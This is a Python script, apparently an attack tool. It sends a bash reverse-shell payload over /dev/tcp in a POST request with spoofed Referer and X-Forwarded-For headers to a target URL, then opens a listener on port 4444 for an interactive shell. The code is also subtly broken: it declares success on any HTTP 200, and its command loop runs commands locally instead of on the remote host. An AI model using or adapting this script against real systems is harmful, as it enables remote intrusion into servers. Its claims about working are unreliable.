import requests
import socket
import subprocess

# Set the target URL and the payload
url = input('Enter target URL: ')
payload = 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'

# Create the headers
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Referer': 'http://victim.com/',
    'X-Forwarded-For': '127.0.0.1',
    'Content-Type': 'application/x-www-form-urlencoded'
}

# Send the payload using POST request
response = requests.post(url, data=payload, headers=headers)

# Check the response
if response.status_code == 200:
    print('Reverse shell established!')
else:
    print('Reverse shell failed.')

# Start a listener on the attacker's machine
listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.bind(('0.0.0.0', 4444))
listener.listen(1)
print('Listening for incoming connections...')

# Accept the connection
client_socket, address = listener.accept()
print(f'Accepted connection from {address}')

# Interact with the client
while True:
    command = input('Enter command: ')
    if command == 'exit':
        break
    output = subprocess.run(command, shell=True, capture_output=True)
    client_socket.send(output.stdout)

# Close the connection
client_socket.close()
listener.close()
